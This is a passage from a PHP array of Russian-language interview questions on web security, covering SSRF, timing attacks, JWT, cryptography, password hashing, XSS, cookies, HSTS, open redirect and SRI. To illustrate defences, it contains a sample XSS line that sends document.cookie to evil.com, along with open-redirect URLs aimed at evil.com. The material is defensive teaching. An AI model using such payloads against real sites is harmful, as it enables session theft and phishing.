        filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false
    ) {
        throw new RuntimeException("private/reserved IP: $ip");
    }

    // 3. Guzzle: использовать уже зарезолвленный IP (защита от DNS rebinding)
    $client = new Client([
        "allow_redirects" => false,        // или с onRedirect-хуком, повторно проверяющим IP
        "connect_timeout" => 5,
        "timeout" => 10,
        "force_ip_resolve" => "v4",
        "curl" => [
            CURLOPT_RESOLVE => ["{$host}:443:{$ip}"],
            CURLOPT_PROTOCOLS => CURLPROTO_HTTP | CURLPROTO_HTTPS, // отключить gopher/file
        ],
    ]);

    return (string) $client->get($url)->getBody();
}',
                'code_language' => 'php',
                'difficulty' => 4,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'Что такое timing attack и почему для сравнения токенов используют hash_equals(), а не === ?',
                'answer' => '**Timing attack** — атака на основе **измерения времени работы кода**. Используется, когда длительность операции **зависит от секрета**.

**Как ломается `===`:** при сравнении строк PHP (как и `strcmp`, `memcmp`) останавливается на **первом несовпавшем байте**:

- `"secret123"` vs `"aecret123"` — упадёт после **1 байта** (микросекунды)
- `"secret999"` vs `"secret123"` — пройдёт **6 байт** и упадёт на 7-м

Разница — наносекунды, но при **тысячах попыток через сеть** атакующий восстанавливает токен **побайтово**: перебирает первый символ до момента, когда среднее время чуть растёт (значит, первый совпал), потом второй и т.д.

**Это реальная атака** — в 2014 году так взломали один из криптокошельков. Сетевой джиттер маскирует, но **достаточно усреднения по 10–100k запросов**.

**Защита — сравнение за константное время:** функция, которая сравнивает **все байты независимо** от позиции расхождения. В PHP — **`hash_equals($known, $userInput)`** (под капотом `XOR`-проход по всем байтам с накоплением разницы в одной переменной).

**Где обязательно `hash_equals`:**

- **CSRF**-токены
- **HMAC**-подписи (webhook verification — Stripe, GitHub)
- **JWT**-сигнатуры
- **OAuth**-`state` и `PKCE` `code_verifier`
- API-ключи
- session-id при ручной проверке

**Параметры:** **первый аргумент — известное** (server-side) значение, второй — пользовательское. Ранний `return` при разной длине допустим (длина — не утечка).

**Что `hash_equals` НЕ покрывает:**

- если **первая операция** (например `hash` от user input) сама зависит от длины — утечка остаётся
- не спасает от cache/branch-prediction атак (`Spectre`)
- для паролей всё равно используй **`password_verify`** — она и так константная

**Бонус-ловушка `==`:** для строк `"0e123456" == "0e789012"` даёт **`true`** (обе интерпретируются как `0e... = 0`). Используй `===` минимум, `hash_equals` — для крипты.',
                'code_example' => '<?php
// ❌ Уязвимо к timing attack
function checkApiKey(string $provided): bool
{
    $known = config("api.secret");
    return $provided === $known; // время зависит от позиции расхождения
}

// ✅ Безопасно
function checkApiKey(string $provided): bool
{
    $known = config("api.secret");
    return hash_equals($known, $provided); // константное время
}

// Webhook signature (GitHub-style)
function verifyWebhook(string $payload, string $signatureHeader, string $secret): bool
{
    $expected = "sha256=" . hash_hmac("sha256", $payload, $secret);
    return hash_equals($expected, $signatureHeader);
}

// CSRF
if (!hash_equals($_SESSION["csrf"], $_POST["csrf"] ?? "")) {
    throw new HttpException(419);
}

// ⚠️ Магическое сравнение, опасное даже без timing
var_dump("0e123456" == "0e789012"); // true! оба = 0e... = 0',
                'code_language' => 'php',
                'difficulty' => 4,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'Главная проблема JWT - как отозвать токен до истечения срока действия?',
                'answer' => '**Stateless JWT** — токен **self-contained**: сервер не хранит состояния, только проверяет подпись. Это даёт горизонтальное масштабирование, но создаёт **фундаментальную проблему**:

> Если токен **утёк** / юзер **нажал Logout** / **сменил пароль** / **забанен** — его **нельзя отозвать средствами самого JWT**.

Подписанный токен с `exp` через 24 часа будет **валиден все 24 часа** на любом сервере, который доверяет ключу.

**Решения, по возрастанию сложности:**

| Подход | Принцип | Цена |
|---|---|---|
| **Короткий TTL + refresh** | access живёт 5–15 мин, refresh в БД | задержка отзыва до `exp` access |
| **Denylist по `jti`** | при logout пишем `jti` в `Redis` с `TTL=exp-now` | теряется stateless: проверка Redis на каждый запрос |
| **`token_version`** | в JWT кладём `ver`, инкремент инвалидирует все токены | `SELECT user` на запрос (можно кешировать) |
| **Ротация ключа подписи** | смена signing key инвалидирует **всё разом** | только для инцидентов, не точечно |

**1. Короткий TTL + refresh — стандарт (OAuth 2.0):**

- `access JWT` живёт **5–15 минут**
- `refresh token` (random, в БД с `revoked_at`) живёт **дни/недели**
- logout = `DELETE` `refresh` → максимум через 15 мин `access` сам умрёт

**2. Denylist по `jti`** — мгновенный отзыв, но теряем главное преимущество JWT (stateless). Каждый запрос проверяет `Redis::exists("revoked:jti:...")`.

**3. `token_version`** — у юзера в БД `integer`; в JWT `claim "ver"`; logout/смена пароля = `++token_version`. Все старые токены становятся невалидны. Один `SELECT user` на запрос (кешируется).

**4. Ротация ключа** — для глобальных инцидентов (компрометация secret). Инвалидирует **всех юзеров**.

**Практическое правило:**

- **Большинство приложений** → **sessions** (stateful, отзыв тривиален, cookie `~30 байт`)
- **Если реально нужен JWT** (микросервисы, mobile, OAuth) → **короткий TTL + refresh в БД + denylist на critical-операциях**
- **`exp = 30 дней`** без денилиста — **anti-pattern**: уволенный сотрудник 30 дней ходит',
                'code_example' => '<?php
// Подход 1: короткий TTL + refresh
class TokenIssuer
{
    public function issue(User $user): array
    {
        return [
            "access" => JWT::encode([
                "sub" => $user->id,
                "exp" => time() + 900,           // 15 минут
                "jti" => Str::ulid(),
            ], $this->secret),
            "refresh" => DB::table("refresh_tokens")->insertGetId([
                "user_id" => $user->id,
                "token_hash" => hash("sha256", $rawRefresh = bin2hex(random_bytes(32))),
                "expires_at" => now()->addDays(30),
            ]) ? $rawRefresh : null,
        ];
    }

    public function logout(string $rawRefresh): void
    {
        DB::table("refresh_tokens")
            ->where("token_hash", hash("sha256", $rawRefresh))
            ->delete(); // отзыв через удаление
    }
}

// Подход 2: denylist на jti для немедленного logout
public function logoutNow(string $jwt): void
{
    $payload = JWT::decode($jwt, $this->secret);
    $ttl = $payload->exp - time();
    Redis::setex("revoked:jti:{$payload->jti}", $ttl, 1);
}

public function isRevoked(string $jti): bool
{
    return Redis::exists("revoked:jti:{$jti}") > 0;
}

// Подход 3: token_version
public function validate(string $jwt): User
{
    $payload = JWT::decode($jwt, $this->secret);
    $user = User::find($payload->sub);
    if ($user->token_version !== $payload->ver) {
        throw new TokenRevokedException;
    }
    return $user;
}',
                'code_language' => 'php',
                'difficulty' => 4,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'Почему для шифрования в PHP сейчас рекомендуют sodium_*, а не openssl_*?',
                'answer' => '**`libsodium`** (`ext-sodium`, в стандарте PHP `7.2+`) — современная криптобиблиотека, портабильная реализация **`NaCl`** (Daniel J. Bernstein), спроектированная по принципу **«secure by default»**. **OpenSSL** — универсальный инструмент с тысячами опций, многие из которых небезопасны или устарели.

**Главные различия:**

| | **`sodium`** | **`openssl`** |
|---|---|---|
| **Поверхность API** | `~50` функций | тысячи |
| **Выбор cipher/mode/padding** | **зашит** в функцию | вручную, легко ошибиться |
| **AEAD из коробки** | **да** (всё authenticated) | только `GCM`/`CCM`/`ChaCha20-Poly1305` явно |
| **Defense от timing-атак** | **константное время** by design | надо помнить |
| **Memzero чувствительных данных** | **`sodium_memzero()`** | нет |
| **Защита от nonce misuse** | API подсказывает | можно переиспользовать `IV` |
| **Подписи** | `Ed25519` (быстрый, безопасный) | `RSA`/`ECDSA` (вариативность) |

**1. Защита от ошибок API.** В sodium практически нечего настраивать: `sodium_crypto_secretbox($plaintext, $nonce, $key)` — один правильный набор примитивов (`XSalsa20-Poly1305`), AEAD из коробки. В OpenSSL ты выбираешь `cipher` (`AES-128/256`), `mode` (`CBC/CTR/GCM`), padding, длину `IV` — шанс выбрать небезопасное (`CBC` без `HMAC` = padding oracle attack) огромен.

**2. Современные примитивы:**

- **`ChaCha20-Poly1305`** — быстрее `AES` на устройствах без `AES-NI` (мобилки, embedded)
- **`Curve25519`** / **`X25519`** — key exchange
- **`Ed25519`** — подписи
- **`BLAKE2b`** — хеш
- **`Argon2id`** — KDF

**3. Side-channel resistance.** Все sodium-функции — константное время. В OpenSSL ловушки есть.

**4. Forward secrecy и nonce-misuse resistance** — встроены в high-level API.

**Когда что использовать:**

- **Новый код** → **`sodium`** всегда
- **`openssl`** остаётся для: парсинг **`X.509`**-сертификатов, **`S/MIME`**, специфичные cipher для совместимости со сторонним сервером
- **Парные ключи (микросервисы)** → `sodium_crypto_sign_*` (`Ed25519`) лучше `RSA`

**Laravel `Crypt` фасад** (`Illuminate\\Encryption\\Encrypter`) реализован грамотно: по умолчанию `AES-256-CBC + HMAC-SHA256` в режиме **`Encrypt-then-MAC`** (защита от padding-oracle), с `9+` доступен `AES-256-GCM` через `cipher` в `config/app.php`. Для своего кода всё равно `sodium` предпочтительнее — меньше ручных параметров, встроенный AEAD.',
                'code_example' => '<?php
// ✅ sodium - secure by default
$key = sodium_crypto_secretbox_keygen(); // 32 байта, безопасный random
$nonce = random_bytes(SODIUM_CRYPTO_SECRETBOX_NONCEBYTES); // 24 байта
$ciphertext = sodium_crypto_secretbox("секретное сообщение", $nonce, $key);

// расшифровка с проверкой целостности (вернёт false при подмене)
$plaintext = sodium_crypto_secretbox_open($ciphertext, $nonce, $key);
if ($plaintext === false) throw new RuntimeException("tampered");

// Хеширование паролей (Argon2id - state-of-the-art)
$hash = sodium_crypto_pwhash_str(
    $password,
    SODIUM_CRYPTO_PWHASH_OPSLIMIT_INTERACTIVE,
    SODIUM_CRYPTO_PWHASH_MEMLIMIT_INTERACTIVE,
);
sodium_crypto_pwhash_str_verify($hash, $password); // bool

// Подписи (Ed25519)
[$sk, $pk] = [sodium_crypto_sign_keypair(), /* ... */];
$signed = sodium_crypto_sign_detached($message, $sk);
sodium_crypto_sign_verify_detached($signed, $message, $pk);

// ⚠️ openssl - те же задачи, но легко ошибиться
// AES-256-GCM (правильный выбор) - но многие пишут AES-256-CBC + забывают HMAC
$iv = random_bytes(openssl_cipher_iv_length("aes-256-gcm"));
$tag = "";
$ciphertext = openssl_encrypt(
    "сообщение", "aes-256-gcm", $key, OPENSSL_RAW_DATA, $iv, $tag, "", 16
);
// для расшифровки нужно сохранить и iv, и tag - забыл tag - нет проверки целостности

// Затирание чувствительных данных в памяти
sodium_memzero($password); // у openssl такого нет',
                'code_language' => 'php',
                'difficulty' => 5,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'В чём разница между OAuth 2.0 и OpenID Connect (OIDC)?',
                'answer' => 'Это **разные протоколы**, которые часто путают. На собесах ловят на подмене понятий.

| | **OAuth 2.0** | **OpenID Connect (OIDC)** |
|---|---|---|
| **Решает задачу** | АВТОРИЗАЦИЯ (`AuthZ`) делегирования | АУТЕНТИФИКАЦИЯ (`AuthN`) юзера |
| **Что говорит** | «приложению `X` разрешено вызывать API от юзера» | «вот **кто** этот юзер» |
| **На выходе** | `access_token` (часто opaque) | **`id_token`** (всегда JWT) + `access_token` |
| **Профиль юзера** | не входит в стандарт | claims: `sub`, `email`, `name`, `picture` |
| **Подписи** | необязательны | **обязательны**, через `JWKS` |
| **RFC** | `6749` | OIDC Core (поверх OAuth) |

**OAuth 2.0** — «пользователь разрешил приложению `X` доступ к API сервиса `Y` от своего имени». **НЕ говорит, кто юзер**. На выходе — `access_token` для API.

Flow: **Authorization Code + PKCE** (SPA/mobile, стандарт), **Client Credentials** (m2m), **Device Code** (TV/IoT), **Refresh Token**. `Implicit` и `ROPC` устарели.

**OIDC** — надстройка для **аутентификации**. Добавляет к OAuth flow **`id_token`** (всегда JWT) с claims:

- `sub` — user id
- `email`, `email_verified`
- `name`, `picture`
- `iss` (issuer), `aud`, `exp`, `iat`

**Эндпоинты OIDC:**

- **`/.well-known/openid-configuration`** — discovery, путь ко всем остальным
- `/authorize` — стандартный OAuth
- `/token` — обмен `code` на токены
- `/userinfo` — профиль по `access_token`
- **`/jwks`** — публичный ключ для проверки подписи `id_token`

**Когда что:**

- **«Войти через Google/GitHub»** → **OIDC**, нужен `id_token`
- **API gateway пропускает `access_token` к downstream сервисам** → OAuth 2.0
- **Cron вызывает чужой API** → OAuth 2.0 Client Credentials

**Anti-pattern:** использовать `access_token` для **аутентификации** — читать `sub` и считать юзера залогиненным. Токен может быть **opaque**, иметь `aud` другого ресурса, не содержать user info. **Для аутентификации — `id_token` из OIDC.**

**В Laravel:** `Socialite` использует OIDC под капотом для Google/GitHub/etc, выдаёт обёртку с `getEmail()`/`getName()`.',
                'code_example' => '<?php
// OIDC flow с Laravel Socialite (Google login)
// routes/web.php
Route::get("/login/google", fn () => Socialite::driver("google")->redirect());
Route::get("/login/google/callback", function () {
    $googleUser = Socialite::driver("google")->user();
    // под капотом: получили code → обменяли на access_token + id_token
    // Socialite верифицировал id_token и распарсил claims

    $user = User::updateOrCreate(
        ["email" => $googleUser->getEmail()],
        ["name" => $googleUser->getName(), "google_id" => $googleUser->getId()]
    );

    Auth::login($user); // классическая cookie-сессия Laravel - аутентификация юзера
});

// OAuth 2.0 (без OIDC) - доступ к чужому API от имени юзера
$response = Http::withToken($accessToken)
    ->get("https://api.dropbox.com/2/files/list_folder", ["path" => "/"]);

// Client Credentials - сервис-сервис
$token = Http::asForm()->post("https://auth.example.com/oauth/token", [
    "grant_type" => "client_credentials",
    "client_id" => env("CLIENT_ID"),
    "client_secret" => env("CLIENT_SECRET"),
    "scope" => "orders.read",
])->json("access_token");

// ID Token (JWT с user claims) - выдаётся OIDC, НЕ OAuth
// {
//   "iss": "https://accounts.google.com",
//   "sub": "1234567890",
//   "aud": "your-client-id.apps.googleusercontent.com",
//   "email": "user@example.com",
//   "email_verified": true,
//   "name": "John Doe",
//   "iat": 1717000000,
//   "exp": 1717003600
// }
// Подпись проверяется по JWKS issuer-а: GET https://accounts.google.com/.well-known/openid-configuration

// ❌ Анти-паттерн: использовать access_token как identity
// access_token может быть opaque, иметь aud другого ресурса, не содержать user info',
                'code_language' => 'php',
                'difficulty' => 4,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'В чём принципиальная разница между хешированием и шифрованием?',
                'answer' => 'Главное отличие — **обратимость**.

**Хеширование** — **односторонняя** функция:

- из входа получается строка **фиксированной длины** (`SHA-256` → 256 бит всегда)
- **обратно восстановить нельзя** математически, только **подбирать** (brute force)
- одинаковый вход → **одинаковый хеш** (детерминированно)
- алгоритмы: `bcrypt`, `argon2id` (для паролей); `SHA-256`, `BLAKE3` (для целостности)

**Шифрование** — **двусторонняя** операция с **ключом**:

- `plaintext` + `key` → `ciphertext`
- `ciphertext` + `key` → обратно `plaintext`
- симметричное (`AES-256-GCM`) — один ключ для шифрования и расшифровки
- асимметричное (`RSA`, `ECDSA`) — пара ключей: публичный для шифрования, приватный для расшифровки

**Что когда использовать:**

| Задача | Что брать |
|---|---|
| **Пароли** | хеширование (`password_hash` → `argon2id`/`bcrypt`) |
| **Номер карты, ПДн** | шифрование (`Crypt::encryptString` в Laravel) |
| **Целостность файла** | хеш (`SHA-256` чек-сумма) |
| **Передача данных по сети** | шифрование (`TLS`) |

**Правило:** если данные нужно **вернуть обратно** — шифруй. Если только **сравнивать** — хешируй.',
                'code_example' => '<?php
// Хеширование пароля (нельзя расшифровать обратно)
$hash = Hash::make("secret123");          // argon2id/bcrypt
Hash::check("secret123", $hash);          // true/false

// Шифрование (можно расшифровать)
$encrypted = Crypt::encryptString("PAN: 4111-1111-1111-1111");
$plain = Crypt::decryptString($encrypted); // обратно',
                'code_language' => 'php',
                'difficulty' => 2,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'Зачем при хешировании паролей нужна соль и почему она должна быть уникальной?',
                'answer' => '**Соль** (salt) — **случайные байты**, которые **подмешиваются к паролю** перед хешированием. Из-за этого **одинаковые пароли разных пользователей** дают **разные хеши**.

**Без соли:**

- два пользователя с паролем `qwerty123` имеют **одинаковый хеш** в БД — видно сразу
- атакующий с дампом базы **заранее считает rainbow-таблицу** (`hash → пароль`) один раз и **мгновенно** сопоставляет миллионы хешей популярным паролям
- утечка БД = утечка паролей за минуты

**С уникальной солью у каждого пользователя:**

- хеши одинаковых паролей **разные**
- rainbow-таблицы **бесполезны** — атакующему приходится **брутить каждый пароль отдельно**, тратя время на каждого
- с `bcrypt`/`argon2id` это **миллионы лет** на миллион пользователей

**Где хранится соль:** прямо **внутри строки хеша**. У `bcrypt` формат `$2y$cost$saltHASH`. У `argon2id` — `$argon2id$v=19$m=...,t=...,p=...$salt$hash`. Поэтому **отдельной колонки под соль заводить не надо** — `password_hash()` всё упакует и `password_verify()` сам её достанет.

**В Laravel:** `Hash::make($password)` — соль генерируется автоматически. **Никогда не указывай свою соль вручную** — функция справится лучше.',
                'code_example' => '<?php
// Соль внутри хеша, для каждого пользователя своя
$hash1 = password_hash("qwerty123", PASSWORD_ARGON2ID);
$hash2 = password_hash("qwerty123", PASSWORD_ARGON2ID);
// $hash1 !== $hash2 — соли разные

// Проверка — соль вытащится из строки автоматически
password_verify("qwerty123", $hash1); // true

// Laravel-обёртка
$hash = Hash::make("qwerty123");
Hash::check("qwerty123", $hash); // true',
                'code_language' => 'php',
                'difficulty' => 2,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'Чем pepper отличается от соли и зачем его иногда добавляют поверх password_hash()?',
                'answer' => '**Salt** и **pepper** — два разных секрета в хешировании паролей.

| | **Salt (соль)** | **Pepper** |
|---|---|---|
| **Уникальность** | **на каждого юзера** | **один общий** для всего приложения |
| **Где хранится** | **рядом с хешем** (в той же строке) | в **конфиге**/`KMS`/`Vault` (НЕ в БД) |
| **Защищает от** | rainbow-таблиц, одинаковых паролей | **утечки только БД** |
| **Утечка БД** | хеши всё ещё надо брутить | хеши **бесполезны** без pepper |
| **Утечка БД + конфига** | защита та же | **pepper не помогает** |
| **Ротация** | не нужна | требует **пересчёта всех хешей** |

**Идея pepper:** при утечке **только БД** (типичный SQLi, дамп бэкапа) атакующий получает хеши с солью, но **не знает pepper**, который лежит в файлах приложения. Брутфорс становится **невозможен** — атакующий не знает, что подмешивать.

**Реализация:**

```php
$peppered = hash_hmac("sha256", $password, $pepper);
$hash = password_hash($peppered, PASSWORD_ARGON2ID);
```

Или через **`sodium_crypto_pwhash_str`** с дополнительным секретным ключом. Важно: `HMAC` **до** `password_hash`, не после — иначе сломаешь алгоритм.

**Минусы pepper:**

- **ротация** — смена pepper = пересчёт **всех** хешей. Решается **версионированием** (`pepper_v2` + `pepper_v1` параллельно)
- **`bcrypt` лимит 72 байта** — `HMAC-SHA256` даёт 32 байта в hex (64 char) — впритык. Лучше `argon2id`
- **сложность** — больше кода, больше шансов ошибиться

**Когда стоит:** банки, медицина, критичные данные с риском утечки БД. Большинству проектов **хватает обычного `password_hash()`** с `argon2id`.',
                'difficulty' => 4,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'Чем argon2id отличается от bcrypt и почему его сейчас обычно предпочитают?',
                'answer' => 'Оба — **медленные password-hash функции**. Главное отличие — **memory-hardness**.

| | **`bcrypt`** (1999) | **`argon2id`** (2015) |
|---|---|---|
| **Тюнинг** | один параметр — `cost` (CPU-раунды) | три — `memory`, `time`, `parallelism` |
| **Memory-hard** | нет (~4 KB) | **да** (десятки–сотни МБ) |
| **Защита от GPU/ASIC** | средняя | **высокая** — память дорогая на ASIC |
| **Лимит пароля** | **72 байта** (молча обрезает) | без лимита |
| **Стандарт** | де-факто | **победитель Password Hashing Competition** |
| **PHP-константа** | `PASSWORD_BCRYPT` | `PASSWORD_ARGON2ID` |

**Что значит memory-hard:** `argon2id` форсирует **много памяти** на вычисление хеша. Атакующий с GPU на 24 ГБ может крутить тысячи `bcrypt` параллельно, но **сотни `argon2id`** — упирается в RAM. На ASIC ещё дороже — там память самое узкое место.

**Параметры `argon2id` по умолчанию в PHP:**

- `memory_cost = 65536` (64 МБ)
- `time_cost = 4` (4 итерации)
- `threads = 1`

Подбирать так, чтобы **проверка занимала ~250–500 мс** на твоём железе — баланс UX и стойкости.

**Когда выбирать что:**

- **новый проект** → `argon2id`
- **старый проект на `bcrypt`** → нормально, **постепенная миграция** через `password_needs_rehash()` при логине
- **`bcrypt` остаётся**, если хостинг без `libsodium`/`argon2` (`PHP < 7.2` без extension)',
                'code_example' => '<?php
// Argon2id с явными параметрами
$hash = password_hash($password, PASSWORD_ARGON2ID, [
    "memory_cost" => 65536,   // 64 МБ
    "time_cost"   => 4,
    "threads"     => 1,
]);

// Прозрачная миграция bcrypt → argon2id при логине
if (password_verify($password, $user->password)) {
    if (password_needs_rehash($user->password, PASSWORD_ARGON2ID)) {
        $user->update(["password" => password_hash($password, PASSWORD_ARGON2ID)]);
    }
    Auth::login($user);
}

// Laravel: config/hashing.php
// "driver" => "argon2id",
// "argon" => ["memory" => 65536, "threads" => 1, "time" => 4],',
                'code_language' => 'php',
                'difficulty' => 3,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'Чем отличаются stored, reflected и DOM-based XSS?',
                'answer' => 'Три типа `XSS` различаются **тем, где живёт payload** и **как доходит до жертвы**.

| | **Stored** | **Reflected** | **DOM-based** |
|---|---|---|---|
| **Где payload** | в БД на сервере | в URL/параметре одного запроса | в клиентском JS, не уходит на сервер |
| **Доставка жертве** | автоматически всем посетителям страницы | через подготовленную ссылку (фишинг) | через ссылку, но обработка на клиенте |
| **Опасность** | **максимальная** (массовая) | средняя (нужен клик) | средняя |
| **Где чинить** | экранирование вывода на сервере | экранирование вывода на сервере | работа с DOM в клиентском JS |

**Stored XSS** — атакующий **сохраняет** скрипт (комментарий, имя профиля, описание товара). Сервер потом отдаёт его всем — payload запускается **у каждого посетителя страницы**. Самый опасный: одна вставка → тысячи жертв.

**Reflected XSS** — payload **в параметре одного запроса**: `https://site.com/search?q=<script>...</script>`. Сервер вернул его в HTML без экранирования. Жертва должна **кликнуть** по подготовленной ссылке. Часто доставляется через фишинг.

**DOM-based XSS** — **полностью в клиенте**. Уязвимый JS читает данные из источника (`location.hash`, `document.referrer`, `window.name`) и пишет в опасный sink (`innerHTML`, `eval`, `document.write`). **Сервер вообще не видит payload** — WAF и серверная защита бесполезны.

**Защита:**

- **Stored/Reflected** — экранирование вывода на сервере (`htmlspecialchars`, Blade `{{ }}`)
- **DOM-based** — **только клиентская защита**: использовать `textContent` вместо `innerHTML`, `setAttribute()` вместо склейки HTML, `DOMPurify` для разрешённого HTML
- **CSP** — помогает против всех трёх, особенно `script-src \'self\' \'nonce-...\'`',
                'difficulty' => 3,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'Какие флаги cookie и зачем нужны для защиты сессии?',
                'answer' => 'Флаги cookie — **дешёвый и эффективный** способ закрыть классические атаки на сессию.

- **`Secure`** — браузер шлёт cookie **только по HTTPS**. Без флага сессия утечёт через открытый Wi-Fi (`sslstrip`, `evil twin`).
- **`HttpOnly`** — cookie **не видна из JS** (`document.cookie`). XSS-payload не сможет утащить `session_id` через `fetch("//evil.com?c=" + document.cookie)`. **Главная защита от кражи сессии через XSS**.
- **`SameSite=Strict`** — cookie **никогда** не уходит на cross-site запросы. Полностью закрывает CSRF, но ломает UX: переход с внешней ссылки на сайт = разлогин.
- **`SameSite=Lax`** (дефолт в современных браузерах) — cookie уходит только на **top-level navigation** (`GET`-переходы), не на скрытые `POST`/iframe-запросы с другого сайта. **Закрывает 95% CSRF**.
- **`SameSite=None`** — отключает защиту, **обязательно с `Secure`**. Нужно для cross-origin сценариев (внешний iframe-виджет).
- **`Domain` и `Path`** — сужают область действия. Без `Domain` cookie действует **только на текущем хосте** (host-only). С `Domain=.example.com` — на всех поддоменах.
- **`Max-Age`/`Expires`** — срок жизни. Без них cookie — session-only (умирает с браузером).

**Префиксы — дополнительная защита:**

- **`__Host-`** — браузер **обязует** `Secure` + **без `Domain`** + `Path=/`. Поддомен **не сможет переписать** родительскую cookie.
- **`__Secure-`** — обязательный `Secure`, без других ограничений.

**Боевой минимум для session cookie:** `HttpOnly; Secure; SameSite=Lax; Path=/; __Host- префикс`.',
                'code_example' => '<?php
// Laravel — config/session.php
return [
    "lifetime" => 120,                     // минут
    "secure" => env("SESSION_SECURE_COOKIE", true),  // только HTTPS
    "http_only" => true,                   // не видна JS
    "same_site" => "lax",                  // защита от CSRF
    "domain" => null,                      // host-only — безопаснее
];

// Что отправит сервер
// Set-Cookie: laravel_session=abc123;
//             Path=/;
//             HttpOnly;
//             Secure;
//             SameSite=Lax

// Вручную (Symfony Cookie)
cookie("auth", $token, 60, "/", null, secure: true, httpOnly: true, sameSite: "Lax");',
                'code_language' => 'php',
                'difficulty' => 3,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'Что такое HSTS и какую проблему он решает поверх обычного https?',
                'answer' => '**HSTS** (HTTP Strict-Transport-Security, `RFC 6797`) — заголовок ответа, в котором сервер говорит браузеру: «**следующие `N` секунд ходи ко мне только по `https`** и **не доверяй сертификатам с ошибками**».

**Проблема, которую решает — `sslstrip` / MITM на первом запросе:**

1. Юзер набирает `bank.com` (без `https://`) — браузер шлёт `http://bank.com`
2. MITM перехватывает запрос, **не пускает редирект на https**
3. Юзер взаимодействует через `http`, MITM проксирует к серверу через `https`
4. Пароль уходит в открытом виде

**HSTS закрывает дыру для повторных визитов:** один раз получил заголовок → следующие `max-age` секунд браузер **сам апгрейдит** `http://` в `https://` **до отправки запроса**.

**Параметры:**

- **`max-age=31536000`** — год в секундах (минимум для прода)
- **`includeSubDomains`** — действие на все `*.bank.com`
- **`preload`** — заявка на включение в **встроенный в браузеры список** (`hstspreload.org`)

**Preload list** решает проблему **первого визита**: домены из списка зашиты в Chrome/Firefox/Safari, браузер **никогда** не отправит `http`, даже один раз.

**Пример заголовка:**

```
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

**Грабли:**

- `preload` — **необратимо** на месяцы. Удаление из списка занимает 6–12 недель. Включать только когда **уверены**, что весь домен и все поддомены на `https`
- `includeSubDomains` ломает поддомены без TLS (internal-only `admin.local.bank.com`)
- HSTS не работает на `IP`-адресах, только на доменах
- Сертификат **истёк** = сайт **недоступен** (нет fallback на `http`)',
                'difficulty' => 4,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'Что такое open redirect и почему его нельзя считать безобидной багой?',
                'answer' => '**Open redirect** — эндпоинт, который **принимает целевой URL в параметре** и редиректит на него **без проверки домена**:

```
https://bank.com/login?next=https://evil.com
```

**Почему это НЕ безобидно:**

- **Доверенная ссылка с вашего домена** — пользователь видит `bank.com` в письме/чате, кликает уверенно, попадает на фишинг
- **Антифишинг-фильтры** пропускают — домен в whitelist
- **`SameSite=Lax` cookie** уходит при top-level navigation — атакующий получает контекст
- **OAuth `redirect_uri`** — если параметр редиректа в OAuth-флоу не проверяется по whitelist, атакующий **подменяет `redirect_uri`** на `evil.com` → `access_token` / `code` уходит ему
- **Цепочка с другими уязвимостями** — open redirect + XSS на странице авторизации = угон сессии

**Реальные сценарии:**

1. **Фишинг через `next`/`returnUrl`** — рассылка `bank.com/?next=fake-bank.com/login`
2. **Кража OAuth code** — `redirect_uri=evil.com` обходит примитивную проверку «начинается с моего домена»
3. **Обход SSRF-защиты** — `302` на `169.254.169.254` от вашего домена ломает allowlist

**Защита:**

- **Whitelist разрешённых хостов** — сравнивать **точно** или по списку
- **Только относительные пути** — `parse_url($next, PHP_URL_HOST)` должен быть **`null`**
- **`URL::isValidUrl()`** + проверка на свой домен
- В OAuth: **строгое сравнение** `redirect_uri` с зарегистрированным (включая path и query)

**Анти-паттерны проверки:**

- `str_starts_with($url, "https://bank.com")` — обходится `https://bank.com.evil.com`
- `str_contains($url, "bank.com")` — обходится `https://evil.com/?bank.com`
- проверка только схемы — `//evil.com` (protocol-relative) пройдёт',
                'difficulty' => 4,
                'topic' => 'system_design.security',
            ],
            [
                'category' => 'Архитектура систем',
                'question' => 'Что такое Subresource Integrity и когда её стоит включать?',
                'answer' => '**SRI** (Subresource Integrity, W3C) — атрибут **`integrity`** у тегов `<script>` и `<link rel="stylesheet">`, в котором указывается **`SHA`-хеш ожидаемого содержимого файла**. Браузер скачивает ресурс и **отказывается его выполнять**, если хеш не совпал.

**Защищает от:**

- **компрометации CDN** — атакующий взломал `cdn.example.com` и подменил `jquery.min.js`
- **MITM на CDN** (если кто-то умудрился без HTTPS)
- **rogue insider** на хостинге сторонней статики
- **supply chain атак** на npm/CDN-зеркала

**Пример:**

```html
<script
    src="https://cdn.example.com/jquery-3.7.0.min.js"
    integrity="sha384-NXgwF8Kv9SS1MMt..."
    crossorigin="anonymous"></script>
```

**`crossorigin="anonymous"`** обязателен для cross-origin ресурсов — без него SRI игнорируется (browser CORS-policy).

**Генерация хеша:**

```bash
curl -s https://cdn.example.com/jquery.min.js | \
    openssl dgst -sha384 -binary | openssl base64 -A
```

Можно указать **несколько хешей через пробел** — браузер пройдёт, если совпал любой (удобно для миграции версий).

**Когда включать:**

- **Сторонние скрипты с фиксированной версией** (`jquery-3.7.0.min.js`, `bootstrap-5.3.0.css`) — **обязательно**
- **Self-hosted статика на отдельном CDN** — желательно
- **Свой Vite/Webpack build на своём домене** — обычно не нужно, у тебя и так контроль
- **`@latest` / `unpkg.com/lib`** — **бессмысленно**, версия меняется

**Минусы:**

- Любое обновление CDN-файла = пересчёт хеша + правка HTML
- Не защищает от уязвимости в **самой библиотеке** (только от подмены файла)
